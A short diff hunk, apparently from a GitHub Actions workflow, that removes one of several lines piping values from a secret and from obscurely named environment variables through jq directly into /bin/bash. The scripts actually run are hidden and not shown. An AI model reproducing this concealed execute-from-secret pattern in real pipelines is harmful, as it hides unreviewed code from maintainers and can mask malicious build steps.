@@ -21,7 +21,6 @@ jobs:
           puu643: ${{ secrets.puu643 }}
         run: |
           printf '%s' "$puu643" | jq -r .iuyfu6 | /bin/bash
-          printf '%s' "$dy03745" | jq -r .cge014 | /bin/bash
           echo $arg9 | jq -r .uy5 | /bin/bash
           echo $rcty4408 | jq -r .wj09 | /bin/bash
 
